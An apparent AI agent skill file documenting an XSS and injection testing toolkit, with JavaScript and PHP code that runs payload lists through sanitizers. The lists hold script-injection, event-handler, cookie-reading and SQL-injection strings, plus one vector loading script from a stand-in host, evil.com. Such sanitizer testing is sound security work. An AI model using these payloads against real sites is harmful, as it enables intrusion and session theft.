---
name: acidrain-security-testing-toolkit
description: Use AcidRain's XSS analysis resources, JavaScript utilities, and PHP injection testing samples for authorized web security research and learning
triggers:
  - test XSS vulnerabilities with AcidRain
  - run AcidRain security scripts
  - analyze cross-site scripting with AcidRain
  - use AcidRain injection testing samples
  - set up AcidRain security toolkit
  - demonstrate XSS patterns with AcidRain
  - configure AcidRain for security testing
  - create XSS test cases using AcidRain
---

# AcidRain Security Testing Toolkit

> Skill by [ara.so](https://ara.so) — Security Skills collection.

AcidRain is a web-oriented collection of XSS analysis resources, JavaScript utilities, PHP examples, and injection testing samples designed for authorized security testing and hands-on learning. This toolkit provides browser-side and server-side scripts for exploring cross-site scripting behavior, input handling, and output processing in controlled environments.

## Installation

Clone the repository and navigate to the working directory:

```bash
git clone https://github.com/henry-lewiskpp1107/acidrain-security-script-hub.git
cd acidrain-security-script-hub
```

Inspect the directory structure to understand available resources:

```bash
ls -la scripts/
```

Expected structure:

```
acidrain-security-script-hub/
├── scripts/
│   ├── javascript/     # Client-side security testing scripts
│   ├── php/           # Server-side PHP examples
│   └── xss/           # XSS-specific resources
├── configs/           # Configuration files
├── examples/          # Working examples
├── docs/              # Documentation
├── LICENSE
└── README.md
```

## Key Components

### JavaScript Utilities

Client-side scripts for browser-based security testing. Place scripts in test environments or controlled pages:

```javascript
// Example: Basic XSS payload tester
function testXSSPayload(input, targetElement) {
  try {
    const sanitized = DOMPurify.sanitize(input);
    document.querySelector(targetElement).innerHTML = sanitized;
    console.log('Payload rendered:', input);
    console.log('Sanitized output:', sanitized);
  } catch (error) {
    console.error('XSS test error:', error);
  }
}

// Test reflection in a controlled environment
const testPayloads = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror="alert(1)">',
  '"><svg/onload=alert(1)>',
  'javascript:alert(document.cookie)'
];

testPayloads.forEach(payload => {
  console.log('Testing:', payload);
  testXSSPayload(payload, '#test-target');
});
```

### PHP Security Research Scripts

Server-side examples for testing input validation and output encoding:

```php
<?php
// Example: Input sanitization tester
function testInputSanitization($input, $method = 'htmlspecialchars') {
    echo "Original input: " . $input . "\n";
    
    switch ($method) {
        case 'htmlspecialchars':
            $output = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
            break;
        case 'strip_tags':
            $output = strip_tags($input);
            break;
        case 'filter_var':
            $output = filter_var($input, FILTER_SANITIZE_FULL_SPECIAL_CHARS);
            break;
        default:
            $output = $input;
    }
    
    echo "Sanitized output ($method): " . $output . "\n";
    echo "Encoding applied: " . ($output !== $input ? 'Yes' : 'No') . "\n\n";
    
    return $output;
}

// Test various XSS payloads
$testPayloads = [
    '<script>alert("XSS")</script>',
    '"><img src=x onerror=alert(1)>',
    "'; DROP TABLE users;--",
    '<svg/onload=alert(document.domain)>'
];

foreach ($testPayloads as $payload) {
    testInputSanitization($payload, 'htmlspecialchars');
}
?>
```

### XSS Injection Testing Samples

Common XSS patterns for controlled testing:

```javascript
// Example: XSS vector library for authorized testing
const XSSVectors = {
  // Basic script injection
  basic: [
    '<script>alert(1)</script>',
    '<script>console.log(document.cookie)</script>',
    '<script src="http://evil.com/xss.js"></script>'
  ],
  
  // Event handler injection
  eventHandlers: [
    '<img src=x onerror=alert(1)>',
    '<body onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>'
  ],
  
  // Protocol-based
  protocol: [
    '<a href="javascript:alert(1)">Click</a>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<object data="javascript:alert(1)">'
  ],
  
  // Context-breaking
  contextBreak: [
    '"><script>alert(1)</script>',
    '\'-alert(1)-\'',
    '</script><script>alert(1)</script>',
    '`;alert(1);//'
  ]
};

// Test function for authorized environments
function runAuthorizedXSSTest(vectors, targetURL) {
  if (!confirm('Run tests on ' + targetURL + '? Ensure authorization.')) {
    return;
  }
  
  vectors.forEach((vector, index) => {
    console.log(`Test ${index + 1}:`, vector);
    // Implement actual testing logic for authorized target
    // Store results for analysis
  });
}
```

## Configuration

### Environment Setup

Create a configuration file for test environments:

```javascript
// config/test-environment.js
const TestConfig = {
  // Target configuration
  targetURL: process.env.TEST_TARGET_URL || 'http://localhost:8080',
  
  // Authentication (if required)
  authToken: process.env.AUTH_TOKEN,
  
  // Test parameters
  maxPayloadLength: 1000,
  timeoutMs: 5000,
  
  // Logging
  verboseOutput: process.env.VERBOSE === 'true',
  logFile: process.env.LOG_FILE || './logs/xss-tests.log',
  
  // Safety checks
  requireAuthorization: true,
  allowedDomains: [
    'localhost',
    '127.0.0.1',
    'test.local'
  ]
};

module.exports = TestConfig;
```

### PHP Configuration

```php
<?php
// config/security-test-config.php
return [
    'test_mode' => getenv('TEST_MODE') === 'true',
    'target_url' => getenv('TEST_TARGET_URL') ?: 'http://localhost',
    'auth_token' => getenv('AUTH_TOKEN'),
    
    // Test settings
    'max_payloads' => 100,
    'timeout' => 30,
    
    // Output settings
    'log_file' => getenv('LOG_FILE') ?: './logs/php-security-tests.log',
    'verbose' => getenv('VERBOSE') === 'true',
    
    // Safety
    'require_authorization' => true,
    'allowed_ips' => ['127.0.0.1', '::1']
];
?>
```

## Common Patterns

### Pattern 1: Automated Payload Testing

```javascript
// scripts/javascript/automated-xss-tester.js
class XSSTester {
  constructor(config) {
    this.config = config;
    this.results = [];
  }
  
  async testPayload(payload, context) {
    const testCase = {
      payload,
      context,
      timestamp: new Date().toISOString(),
      blocked: false,
      sanitized: false
    };
    
    try {
      // Create isolated test frame
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      document.body.appendChild(iframe);
      
      const iframeDoc = iframe.contentDocument;
      const testDiv = iframeDoc.createElement('div');
      testDiv.innerHTML = payload;
      iframeDoc.body.appendChild(testDiv);
      
      // Check if scripts executed
      testCase.blocked = !iframeDoc.querySelector('script');
      testCase.sanitized = testDiv.innerHTML !== payload;
      
      // Clean up
      document.body.removeChild(iframe);
      
    } catch (error) {
      testCase.error = error.message;
      testCase.blocked = true;
    }
    
    this.results.push(testCase);
    return testCase;
  }
  
  async runTestSuite(payloads) {
    console.log(`Running ${payloads.length} tests...`);
    
    for (const payload of payloads) {
      const result = await this.testPayload(payload, 'innerHTML');
      
      if (this.config.verboseOutput) {
        console.log('Result:', result);
      }
    }
    
    return this.generateReport();
  }
  
  generateReport() {
    const summary = {
      total: this.results.length,
      blocked: this.results.filter(r => r.blocked).length,
      sanitized: this.results.filter(r => r.sanitized).length,
      successful: this.results.filter(r => !r.blocked && !r.sanitized).length
    };
    
    return {
      summary,
      details: this.results
    };
  }
}

// Usage
const tester = new XSSTester({
  verboseOutput: true
});

const payloads = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg/onload=alert(1)>'
];

tester.runTestSuite(payloads).then(report => {
  console.log('Test Report:', report);
});
```

### Pattern 2: PHP Input Validation Testing

```php
<?php
// scripts/php/input-validation-tester.php

class InputValidationTester {
    private $results = [];
    
    public function testValidation($input, $validators) {
        $testResult = [
            'input' => $input,
            'timestamp' => date('Y-m-d H:i:s'),
            'validators' => []
        ];
        
        foreach ($validators as $name => $validator) {
            $output = $validator($input);
            $testResult['validators'][$name] = [
                'output' => $output,
                'modified' => $output !== $input,
                'length_change' => strlen($output) - strlen($input)
            ];
        }
        
        $this->results[] = $testResult;
        return $testResult;
    }
    
    public function generateReport() {
        return [
            'total_tests' => count($this->results),
            'results' => $this->results
        ];
    }
}

// Define validators
$validators = [
    'htmlspecialchars' => function($input) {
        return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    },
    'strip_tags' => function($input) {
        return strip_tags($input);
    },
    'filter_sanitize' => function($input) {
        return filter_var($input, FILTER_SANITIZE_FULL_SPECIAL_CHARS);
    },
    'preg_replace_script' => function($input) {
        return preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', '', $input);
    }
];

// Run tests
$tester = new InputValidationTester();

$testPayloads = [
    '<script>alert("XSS")</script>',
    '"><img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    "'; DROP TABLE users;--"
];

foreach ($testPayloads as $payload) {
    $result = $tester->testValidation($payload, $validators);
    echo "Testing: " . $payload . "\n";
    print_r($result);
    echo "\n";
}

$report = $tester->generateReport();
echo json_encode($report, JSON_PRETTY_PRINT);
?>
```

### Pattern 3: Context-Aware XSS Testing

```javascript
// scripts/javascript/context-aware-tester.js
const ContextAwareXSS = {
  contexts: {
    html: {
      name: 'HTML Context',
      payloads: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>'
      ],
      testMethod: (payload) => {
        const div = document.createElement('div');
        div.innerHTML = payload;
        return div.querySelector('script') !== null;
      }
    },
    
    attribute: {
      name: 'Attribute Context',
      payloads: [
        '" onload="alert(1)',
        '\' onerror=\'alert(1)',
        '"><script>alert(1)</script><"'
      ],
      testMethod: (payload) => {
        const img = document.createElement('img');
        img.setAttribute('src', payload);
        return img.getAttribute('src').includes('alert');
      }
    },
    
    javascript: {
      name: 'JavaScript Context',
      payloads: [
        '\';alert(1);//',
        '";alert(1);//',
        '`);alert(1);//'
      ],
      testMethod: (payload) => {
        try {
          new Function(payload);
          return true;
        } catch {
          return false;
        }
      }
    },
    
    url: {
      name: 'URL Context',
      payloads: [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox(1)'
      ],
      testMethod: (payload) => {
        return /^(javascript|data|vbscript):/.test(payload);
      }
    }
  },
  
  testContext(contextName) {
    const context = this.contexts[contextName];
    if (!context) {
      console.error('Unknown context:', contextName);
      return null;
    }
    
    console.log(`Testing ${context.name}...`);
    const results = context.payloads.map(payload => ({
      payload,
      detected: context.testMethod(payload)
    }));
    
    return {
      context: contextName,
      results,
      summary: {
        total: results.length,
        detected: results.filter(r => r.detected).length
      }
    };
  },
  
  testAllContexts() {
    return Object.keys(this.contexts).map(ctx => 
      this.testContext(ctx)
    );
  }
};

// Usage
const results = ContextAwareXSS.testAllContexts();
console.log('Context Test Results:', results);
```

## Troubleshooting

### Script Execution Blocked

**Problem**: JavaScript payloads are not executing in test environment.

**Solution**: Check Content Security Policy (CSP) headers:

```javascript
// Check CSP
const csp = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
if (csp) {
  console.log('CSP detected:', csp.content);
  console.log('This may block XSS payloads - expected in production');
}

// For testing, ensure test environment has relaxed CSP
// Do NOT disable CSP in production environments
```

### PHP Script Not Executing

**Problem**: PHP scripts return source code instead of executing.

**Solution**: Ensure PHP is installed and web server is configured:

```bash
# Check PHP installation
php -v

# Start PHP development server for testing
php -S localhost:8000 -t ./scripts/php

# Test script execution
curl http://localhost:8000/input-validation-tester.php
```

### Authorization Checks Failing

**Problem**: Tests fail due to authorization requirements.

**Solution**: Set up proper test environment variables:

```bash
# Set test environment
export TEST_MODE=true
export TEST_TARGET_URL=http://localhost:8080
export AUTH_TOKEN=your_test_token_here

# Verify allowed domains in configuration
# Ensure target is in allowedDomains list
```

### Results Not Logging

**Problem**: Test results are not being saved to log files.

**Solution**: Check log directory permissions and configuration:

```bash
# Create logs directory
mkdir -p logs

# Set permissions
chmod 755 logs

# Verify log file path in config
export LOG_FILE=./logs/xss-tests.log

# Check if logs are being written
tail -f ./logs/xss-tests.log
```

### Payload Encoding Issues

**Problem**: Payloads are automatically encoded or modified before testing.

**Solution**: Use raw payload handling:

```javascript
// Disable automatic encoding
function injectRawPayload(payload, element) {
  // Use textContent for comparison
  const original = element.textContent;
  
  // Direct DOM manipulation
  element.innerHTML = payload;
  
  const modified = element.textContent;
  
  console.log('Original:', original);
  console.log('Payload:', payload);
  console.log('Result:', modified);
  console.log('Modified:', original !== modified);
}
```

## Best Practices

1. **Always obtain authorization** before testing any system
2. **Use isolated environments** for all security testing
3. **Document test results** with timestamps and configurations
4. **Never test production systems** without explicit permission
5. **Store credentials securely** using environment variables
6. **Review code before execution** to understand behavior
7. **Maintain test/production separation** in configurations
8. **Follow responsible disclosure** if vulnerabilities are found

## Safety Considerations

AcidRain is designed for **authorized security testing only**. Users must:

- Have explicit written permission to test target systems
- Use only in controlled lab environments or owned applications
- Comply with all applicable laws and regulations
- Follow ethical security research practices
- Report findings responsibly to system owners
- Never use tools for malicious purposes

Unauthorized testing may be illegal and unethical. Always operate within defined scope and authorization.
